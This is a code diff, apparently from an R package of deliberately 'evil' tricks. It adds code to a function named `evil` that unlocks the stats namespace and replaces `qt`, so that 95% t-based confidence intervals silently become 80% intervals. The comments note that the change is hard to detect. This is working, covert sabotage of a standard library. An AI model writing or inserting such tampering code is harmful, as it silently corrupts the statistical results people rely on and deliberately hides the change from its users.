@@ -105,6 +105,30 @@ evil <- function( ){
          pos = baseenv()
   )
   
+  # All your 95% confindence intervals are now 80% intervals. Only detectable
+  # looking at stats::qt. qt remains the same.
+  # try for example:
+  # qt
+  # stats::qt
+  # a <- rnorm(100)
+  # t.test(a)
+  # # then after changing qt
+  # t.test(a)
+  statsenv <- loadNamespace("stats")
+  unlockBinding("qt", statsenv )
+  assign("qt", 
+         local({
+           realqt <- stats::qt
+           function (p, df, ncp, lower.tail = TRUE, log.p = FALSE) {
+             p[p==.025] <- .1
+             p[p==.975] <- .9
+             realqt(p, df, ncp, lower.tail, log.p)
+           }
+         }), 
+         pos = statsenv
+  )
+  
+  
   invisible(NULL)
   
 }
